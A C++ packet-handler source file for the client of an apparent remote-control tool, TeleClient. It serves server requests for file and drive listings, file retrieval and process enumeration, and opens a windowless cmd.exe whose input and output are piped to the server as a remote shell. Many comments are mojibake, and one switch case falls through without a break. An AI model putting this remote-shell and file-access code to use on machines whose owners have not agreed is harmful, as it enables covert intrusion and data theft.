//******************************************************************************
// License:     MIT
// Author:      Hoffman
// Create Time: 2018-07-24
// Description: 
//      The functions achieve for deal with package from server.
//
// Modify Log:
//      2018-07-24    Hoffman
//      Info: a. Add below functions.
//              a.1. OnHandlePacket();
//
//      2018-11-22    Hoffman
//      Info: a. Modify below functions.
//              a.1. OnCMDOrder(): 
//                  a.1.1. Add order content check.
//
//      2018-11-28    Hoffman
//      Info: a. Add below functions.
//              a.1. OnPauseCommand();
//            b. Modify below functions.
//              a.1. OnHandlePacket();
//                  a.1.1. Add code deal with PT_FILECOMMAND_PAUSE;
//******************************************************************************

#include "stdafx.h"
#include "CommunicationIOCP.h"
#include "TeleClientDlg.h"
#include "StructShare.h"
#include "PacketHandle.h"
#include "assistFunc.h"

BOOL DosPathToNtPath(LPTSTR pszDosPath, LPTSTR pszNtPath)
{
    TCHAR szDriveStr[500];
    TCHAR szDrive[3];
    TCHAR szDevName[100];
    INT cchDevName;

    //������
    if (!pszDosPath || !pszNtPath)
    {
        return FALSE;
    }
 
    //��ȡ���ش����ַ���
    if(GetLogicalDriveStrings(sizeof(szDriveStr), szDriveStr))
    {
        for(size_t cntI = 0; szDriveStr[cntI]; cntI += 4)
        {
            if (!lstrcmpi(&(szDriveStr[cntI]), _T("A:\\"))
                || !lstrcmpi(&(szDriveStr[cntI]), _T("B:\\")))
            {
                continue;
            }
 
            szDrive[0] = szDriveStr[cntI];
            szDrive[1] = szDriveStr[cntI + 1];
            szDrive[2] = '\0';
            if (!QueryDosDevice(szDrive, szDevName, 100))
            {
                //��ѯ Dos �豸��
                return FALSE;
            }
 
            cchDevName = lstrlen(szDevName);
            if (_tcsnicmp(pszDosPath, szDevName, cchDevName) == 0)//����
            {
                //����������
                lstrcpy(pszNtPath, szDrive);
                //����·��
                lstrcat(pszNtPath, pszDosPath + cchDevName);
                return TRUE;
            }           
        }
    } // if END
 
    lstrcpy(pszNtPath, pszDosPath);
     
    return FALSE;
}

BOOL GetProcessFullPath(DWORD dwPID, TCHAR szFullPath[MAX_PATH])
{
    TCHAR  szImagePath[MAX_PATH];
    HANDLE hProcess;
    if(!szFullPath)
        return FALSE;
 
    szFullPath[0] = '\0';
    hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, 0, dwPID);
    if(!hProcess)
        return FALSE;
 
    if(!GetProcessImageFileName(hProcess, szImagePath, MAX_PATH))
    {
        CloseHandle(hProcess);
        return FALSE;
    }
 
    if(!DosPathToNtPath(szImagePath, szFullPath))
    {
        CloseHandle(hProcess);
        return FALSE;
    }
 
    CloseHandle(hProcess);
 
    return TRUE;
}

BOOL OnFileList(SOCKET sctTargetSocket,
                char *szBuffer,
                size_t uiLen,
                PCLIENTINFO  pstClientInfo,
                CCommunicationIOCP &IOCP)
{
    CString csCompeletPath;

    memmove(csCompeletPath.GetBufferSetLength(PACKET_CONTENT_MAXSIZE),
            szBuffer,
            uiLen);
    csCompeletPath.ReleaseBuffer();
    // ��ս�����ʱ������
    memset(szBuffer, 0, uiLen);

    // ��ȡ�ļ��б�ʹ�ýṹ��浥���ļ���Ϣ��ÿ���ṹ���� '|' �ָ� 
    CString csFileList;
    CFileFind Finder;
    CString csWildcard(csCompeletPath + _T("\\*.*"));

    BOOL bWorking = Finder.FindFile(csWildcard);
    // �����ļ��б�
    while (bWorking)
    {
        CString csFileInfo;
        bWorking = Finder.FindNextFile();
        CString csFilePath = Finder.GetFilePath();
        CFileStatus FileStatus;

        // ��ȡ�ļ�����
        DWORD dwFileAttribute = GetFileAttributes(csFilePath);

        // ��ȡ�ļ���Ӧ��ϵͳͼ������
        SHFILEINFO stSfi;
        SHGetFileInfo(csFilePath,
                      dwFileAttribute,
                      &stSfi,
                      sizeof(stSfi),
                      SHGFI_SYSICONINDEX | SHGFI_USEFILEATTRIBUTES);

        // Get file's status.
        CFile::GetStatus(csFilePath, FileStatus);

        // ����ļ���Ϣ
        csFileInfo.Format(
            _T("%d?%s?%s?%I64u?%s|"),
            stSfi.iIcon,
            Finder.GetFileName().GetString(),
            FileStatus.m_mtime.Format(_T("%Y/%m/%d %H:%M")).GetString(),
            FileStatus.m_size,
            stSfi.szTypeName);

        // ���뵽�����б���
        csFileList += csFileInfo;
    } //! while �����ļ��б� END

    Finder.Close();

    BOOL bRet = FALSE;
    // ���ļ���Ϣ�б��������ͻ�����
    if (csFileList.GetLength() <= PACKET_CONTENT_MAXSIZE)
    {
        PPACKETFORMAT pstPacket = (PPACKETFORMAT)pstClientInfo->szSendTmpBuffer_;
        pstPacket->ePacketType_ = PT_FILE_LIST;

        pstClientInfo->CriticalSection_.Lock();
        // The size include '\0'.
        pstPacket->dwSize_ = (csFileList.GetLength() + 1) * sizeof(TCHAR); 

        memmove(pstPacket->szContent_,
                csFileList.GetBuffer(),
                pstPacket->dwSize_);

        pstClientInfo->SendBuffer_.Write(
            (PBYTE)pstClientInfo->szSendTmpBuffer_,
            PACKET_HEADER_SIZE + pstPacket->dwSize_);

        // Ͷ��Send����
        bRet = IOCP.PostSendRequst(sctTargetSocket,
                                   pstClientInfo->SendBuffer_);

        pstClientInfo->SendBuffer_.ClearBuffer();
        pstClientInfo->CriticalSection_.Unlock();
    }
    else
    {
        OutputDebugString(_T("The filelist info over"
                             "PACKET_CONTENT_MAXSIZE!\r\n"));
        return FALSE;
    }


    return bRet;
} //! OnFileList END

BOOL OnFileDevice(SOCKET sctTargetSocket,
                  char *szBuffer,
                  size_t uiLen,
                  PCLIENTINFO  pstClientInfo,
                  CCommunicationIOCP &IOCP)
{
    // Get Driver.
    CString csDriver;
    DWORD dwRet = 
        GetLogicalDriveStrings(MAXBYTE - 1,
                               csDriver.GetBufferSetLength(MAXBYTE - 1));
    csDriver.ReleaseBuffer();
    if (dwRet == 0)
    {
#ifdef DEBUG
        OutputDebugString(_T("��ȡ�̷�����ʧ��\r\n"));
#endif // DEBUG
        return FALSE;
    }
    else if (dwRet > MAXBYTE)
    {
#ifdef DEBUG
        CString csFailInfo;
        csFailInfo.Format(_T("�̷����ƴ洢��������С, ��Ҫ�ֽ�����%u"), dwRet);
        OutputDebugString(csFailInfo);
#endif // DEBUG
        return FALSE;   
    }

    PPACKETFORMAT pstPacket = (PPACKETFORMAT)pstClientInfo->szSendTmpBuffer_;
    pstPacket->ePacketType_ = PT_FILE_DEVICE;

    // ���̷���Ϣ�б��������ͻ�����
    if (dwRet <= PACKET_CONTENT_MAXSIZE)
    {
        pstPacket->dwSize_ = dwRet * sizeof(TCHAR);

        memmove(pstPacket->szContent_,
                csDriver.GetBuffer(),
                pstPacket->dwSize_);
    }
    else
    {
#ifdef DEBUG
        OutputDebugString(_T("�̷���Ϣ����PACKET_CONTENT_MAXSIZE\r\n"));
#endif // DEBUG
        return FALSE;
    }

    pstClientInfo->CriticalSection_.Lock();
    pstClientInfo->SendBuffer_.Write(
        (PBYTE)pstClientInfo->szSendTmpBuffer_,
        PACKET_HEADER_SIZE + pstPacket->dwSize_);

    // Ͷ��Send����
    BOOL bRet = IOCP.PostSendRequst(sctTargetSocket,
                                    pstClientInfo->SendBuffer_);

    pstClientInfo->SendBuffer_.ClearBuffer();
    pstClientInfo->CriticalSection_.Unlock();
    return bRet;
} //! OnFileDevice END

BOOL OnGetFileCommand(SOCKET sctTargetSocket,
                      char *szBuffer,
                      size_t uiLen,
                      PCLIENTINFO  pstClientInfo,
                      CCommunicationIOCP &IOCP)
{
    CString csFileListToGet;

    memmove(csFileListToGet.GetBufferSetLength(PACKET_CONTENT_MAXSIZE),
            szBuffer,
            uiLen);
    csFileListToGet.ReleaseBuffer();

    // Clean the temporary buffer of revice.
    memset(szBuffer, 0, uiLen);

    pstClientInfo->pTeleClientDlg_->SendMessage(WM_GETFILE,
                                                (WPARAM)&csFileListToGet,
                                                (LPARAM)pstClientInfo);

    return TRUE;

} //! OnGetFileCommand END

BOOL OnPauseCommand(SOCKET sctTargetSocket,
                    char *szBuffer,
                    size_t uiLen,
                    PCLIENTINFO  pstClientInfo,
                    CCommunicationIOCP &IOCP)
{
    // The filename with path in szBuffer.
    CString csFileNameWithBuffer;

    memmove(csFileNameWithBuffer.GetBufferSetLength(PACKET_CONTENT_MAXSIZE),
            szBuffer,
            uiLen);
    csFileNameWithBuffer.ReleaseBuffer();

    // Clean the temporary buffer of revice.
    memset(szBuffer, 0, uiLen);

    pstClientInfo->pTeleClientDlg_->SendMessage(WM_TASKPAUSE,
                                                (WPARAM)&csFileNameWithBuffer,
                                                (LPARAM)pstClientInfo);

    return TRUE;
} //! OnPauseCommand() END

BOOL OnCmdCommandStart(PCLIENTINFO  pstClientInfo)
{
    SECURITY_ATTRIBUTES stSa;
    stSa.nLength = sizeof(stSa);
    stSa.lpSecurityDescriptor = NULL;
    stSa.bInheritHandle = TRUE;

    do
    {
        // Create pipe
        BOOL bRet = CreatePipe(&pstClientInfo->hServerCmdReadPipe_,
                               &pstClientInfo->hCmdWritePipe_,
                               &stSa,
                               0);

        bRet = CreatePipe(&pstClientInfo->hCmdReadPipe_,
                          &pstClientInfo->hServerCmdWritePipe_,
                          &stSa,
                          0);
        if (!bRet)
        {
#ifdef DEBUG
            OutputDebugStringWithInfo(_T("Create pipe failed.\r\n"),
                                      __FILET__,
                                      __LINE__);
#endif // DEBUG

            break;
        }

        // Start CMD process.
        TCHAR szCmdline[] = _T("cmd.exe");
        STARTUPINFO stSi = { 0 };
        stSi.cb = sizeof(stSi);
        stSi.dwFlags |= STARTF_USESTDHANDLES;
        stSi.hStdInput = pstClientInfo->hCmdReadPipe_;
        stSi.hStdOutput = pstClientInfo->hCmdWritePipe_;
        stSi.hStdError = pstClientInfo->hCmdWritePipe_;
        PROCESS_INFORMATION stPi;
        bRet = CreateProcess(NULL, 
                             szCmdline,
                             NULL,
                             NULL,
                             TRUE,
                             CREATE_NO_WINDOW,
                             NULL,
                             NULL,
                             &stSi,
                             &stPi);
        if (!bRet)
        {
#ifdef DEBUG
            OutputDebugString(_T("CMD����ʧ��\r\n"));
#endif // DEBUG
            break;
        }

        CloseHandle(stPi.hThread);
        CloseHandle(stPi.hProcess);

        // ����Ϣ��������ȥ�����߳�
        if (pstClientInfo->pTeleClientDlg_ != NULL)
        {
            bRet = pstClientInfo->pTeleClientDlg_->
                SendMessage(WM_CREATECMDRECVTHREAD, 0, 0);

            if (!bRet)
            {
#ifdef DEBUG
                OutputDebugString(_T("�����߳�ʧ��\r\n"));
#endif // DEBUG
                break;
            }
        }

        // Successfully end.
        return TRUE;
    } while (FALSE);

    // Deal with error and close those pipe.
    if (pstClientInfo->hServerCmdReadPipe_ != INVALID_HANDLE_VALUE)
    {
        CloseHandle(pstClientInfo->hServerCmdReadPipe_);
        pstClientInfo->hServerCmdReadPipe_ = INVALID_HANDLE_VALUE;
    }

    if (pstClientInfo->hServerCmdWritePipe_ != INVALID_HANDLE_VALUE)
    {
        CloseHandle(pstClientInfo->hServerCmdWritePipe_);
        pstClientInfo->hServerCmdWritePipe_ = INVALID_HANDLE_VALUE;
    }

    if (pstClientInfo->hCmdReadPipe_ != INVALID_HANDLE_VALUE)
    {
        CloseHandle(pstClientInfo->hCmdReadPipe_);
        pstClientInfo->hCmdReadPipe_ = INVALID_HANDLE_VALUE;
    }
    if (pstClientInfo->hCmdWritePipe_ != INVALID_HANDLE_VALUE)
    {
        CloseHandle(pstClientInfo->hCmdWritePipe_);
        pstClientInfo->hCmdWritePipe_ = INVALID_HANDLE_VALUE;
    }
    
    // Failure end.
    return FALSE;
}

BOOL OnCMDOrder(SOCKET sctTargetSocket,
                char *szBuffer,
                size_t uiLen,
                PCLIENTINFO  pstClientInfo,
                CCommunicationIOCP &IOCP)
{
    // ��ȡָ��
    CString csOrder;
    memmove(csOrder.GetBufferSetLength(PACKET_CONTENT_MAXSIZE),
            szBuffer,
            uiLen);
    csOrder.ReleaseBuffer();

    if (_T("exit\r\n") != csOrder)
    {
        memset(szBuffer, 0, uiLen);
    }
    
    // ������Ϣ����������CMDָ��Ҫ����
    BOOL bRet = pstClientInfo->pTeleClientDlg_->
        SendMessage(WM_SENDORDERTOCMD,
                    (WPARAM)&csOrder,
                    0);

    return bRet;
}

BOOL OnScreenPictrue(SOCKET sctTargetSocket,
                     char *szBuffer,
                     size_t uiLen,
                     PCLIENTINFO  pstClientInfo,
                     CCommunicationIOCP &IOCP)
{

    return TRUE;
}

BOOL OnProcessInfo(SOCKET sctTargetSocket,
                   char *szBuffer,
                   size_t uiLen,
                   PCLIENTINFO  pstClientInfo,
                   CCommunicationIOCP &IOCP)
{
    // ��ȡ������Ϣ
    HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hProcessSnap == INVALID_HANDLE_VALUE)
    {
        AfxMessageBox(_T("��ȡ������Ϣʧ��"));
        return FALSE;
    }

    // ����
    PROCESSENTRY32 stProess32;
    stProess32.dwSize = sizeof(stProess32);

    if(!Process32First(hProcessSnap, &stProess32))
    {
        CloseHandle(hProcessSnap);   
        return FALSE;
    }

    CString csProcessInfoList;
    int iIndex = 0;
    do
    {
        CString csProcessInfo;
        TCHAR szNumber[MAXBYTE] = { 0 };
        TCHAR szFullPath[MAX_PATH] = { 0 };

        // Get name of exe file.
        csProcessInfo += stProess32.szExeFile;
        // Get Id.
        csProcessInfo += _T("?");
        csProcessInfo += _itot(stProess32.th32ProcessID,
                               szNumber,
                               10);

        // Get Id of parent process.
        csProcessInfo += _T("?");
        csProcessInfo += _itot(stProess32.th32ParentProcessID,
                               szNumber,
                               10);
        csProcessInfo += _T("?");

        // Get full path.
        GetProcessFullPath(stProess32.th32ProcessID, szFullPath);
        csProcessInfo += szFullPath;

        csProcessInfoList += csProcessInfo;
        csProcessInfoList += _T("|");

        ++iIndex;
    } while (Process32Next(hProcessSnap, &stProess32));

    // ���ͽ�����Ϣ�б���������
    PPACKETFORMAT pstPacket = (PPACKETFORMAT)pstClientInfo->szSendTmpBuffer_;
    pstPacket->ePacketType_ = PT_PROCESS_INFO;

    // ��������Ϣ�б��������ͻ�����, ����'\0'��β
    if (((csProcessInfoList.GetLength() + 1) * sizeof(TCHAR)) 
        <= PACKET_CONTENT_MAXSIZE)
    {
        pstPacket->dwSize_ = 
            (csProcessInfoList.GetLength() + 1) * sizeof(TCHAR);

        memmove(pstPacket->szContent_,
                csProcessInfoList.GetBuffer(),
                pstPacket->dwSize_);
    }
    else
    {
#ifdef DEBUG
        OutputDebugString(_T("�����б���Ϣ����PACKET_CONTENT_MAXSIZE\r\n"));
#endif // DEBUG
        return FALSE;
    }

    pstClientInfo->CriticalSection_.Lock();
    pstClientInfo->SendBuffer_.Write(
        (PBYTE)pstClientInfo->szSendTmpBuffer_,
        PACKET_HEADER_SIZE + pstPacket->dwSize_);

    // Ͷ��Send����
    BOOL bRet = IOCP.PostSendRequst(sctTargetSocket,
                                    pstClientInfo->SendBuffer_);

    pstClientInfo->SendBuffer_.ClearBuffer();
    pstClientInfo->CriticalSection_.Unlock();
    return bRet;
} //! OnProcessInfo END

BOOL OnProcessCommandKill(SOCKET sctTargetSocket,
                          char *szBuffer,
                          size_t uiLen,
                          PCLIENTINFO  pstClientInfo,
                          CCommunicationIOCP &IOCP)
{

    return TRUE;
}


BOOL OnHandlePacket(PACKETTYPE ePacketType,
                    SOCKET sctTargetSocket,
                    char *szBuffer,
                    PACKETFORMAT &ref_stHeader,
                    PCLIENTINFO  pstClientInfo,
                    CCommunicationIOCP &IOCP)
{
    BOOL bRet = FALSE;
    
    switch (ePacketType)
    {
        case PT_HEARTBEAT:
        {
            // ���
            memset(szBuffer, 0, ref_stHeader.dwSize_);
            break;
        }
        case PT_FILE_LIST:
        {
            bRet = OnFileList(sctTargetSocket,
                              szBuffer,
                              ref_stHeader.dwSize_,
                              pstClientInfo,
                              IOCP);
            if (!bRet)
            {
            }

            break;
        }
        case PT_FILE_DEVICE:
        {
            bRet = OnFileDevice(sctTargetSocket,
                                szBuffer,
                                ref_stHeader.dwSize_,
                                pstClientInfo,
                                IOCP);
            if (!bRet)
            {
            }

            break;
        }
        case PT_FILECOMMAND_GETFILE:
        {
            bRet = OnGetFileCommand(sctTargetSocket,
                                    szBuffer,
                                    ref_stHeader.dwSize_,
                                    pstClientInfo,
                                    IOCP);
            break;
        }
        case PT_FILECOMMAND_PAUSE:
        {
            bRet = OnPauseCommand(sctTargetSocket,
                                  szBuffer,
                                  ref_stHeader.dwSize_,
                                  pstClientInfo,
                                  IOCP);
            break;
        }
        case PT_SCREENPICTURE:
        {
            bRet = OnScreenPictrue(sctTargetSocket,
                                   szBuffer,
                                   ref_stHeader.dwSize_,
                                   pstClientInfo,
                                   IOCP);
            if (!bRet)
            {
            }
            break;
        }
        case PT_PROCESS_INFO:
        {
            bRet = OnProcessInfo(sctTargetSocket,
                                 szBuffer,
                                 ref_stHeader.dwSize_,
                                 pstClientInfo,
                                 IOCP);
#ifdef DEBUG
            if (bRet)
            {
                OutputDebugStringWithInfo(
                    _T("Deal with PT_PROCESS_INFO over.\r\n"),
                    __FILET__,
                    __LINE__);
            }
#endif // DEBUG

            break;
        }
        case PT_PROCESSCOMMAND_KILL:
        {
#ifdef DEBUG
#endif // DEBUG
            bRet = OnProcessCommandKill(sctTargetSocket,
                                        szBuffer,
                                        ref_stHeader.dwSize_,
                                        pstClientInfo,
                                        IOCP);
            if (!bRet)
            {
            }
        }
        case PT_CMDCOMMAND_END:
        {
#ifdef DEBUG
            OutputDebugStringWithInfo(_T("Get cmd command end.\r\n"),
                                      __FILET__,
                                      __LINE__);
#endif // DEBUG
            TCHAR *szEndOrder = _T("exit\r\n");
            bRet = OnCMDOrder(sctTargetSocket,
                              (char *)szEndOrder,
                              (_tcslen(szEndOrder) + 1) * sizeof(TCHAR),
                              pstClientInfo,
                              IOCP);
            if (!bRet)
            {
#ifdef DEBUG
            OutputDebugStringWithInfo(_T("Deal with cmd command"
                                         "end failed.\r\n"),
                                      __FILET__,
                                      __LINE__);
#endif // DEBUG
            }

            break;
        }
        case PT_CMDCOMMAND_START:
        {
            bRet = OnCmdCommandStart(pstClientInfo);
            if (!bRet)
            {
#ifdef DEBUG
                OutputDebugStringWithInfo(_T("Start CMD failed.\r\n"),
                                          __FILET__,
                                          __LINE__);
#endif // DEBUG

            }
            break;
        }
        case PT_CMD_ORDER:
        {
#ifdef DEBUG
            OutputDebugStringWithInfo(_T("Recieve CMD order.\r\n"),
                                      __FILET__,
                                      __LINE__);
#endif // DEBUG

            bRet = OnCMDOrder(sctTargetSocket,
                              szBuffer,
                              ref_stHeader.dwSize_,
                              pstClientInfo,
                              IOCP);
            if (!bRet)
            {
            }
            break;
        }
        default:
        {
            break;
        }
    } //! switch "Packet's type" END

    return bRet;
} //! OnHandlePacket END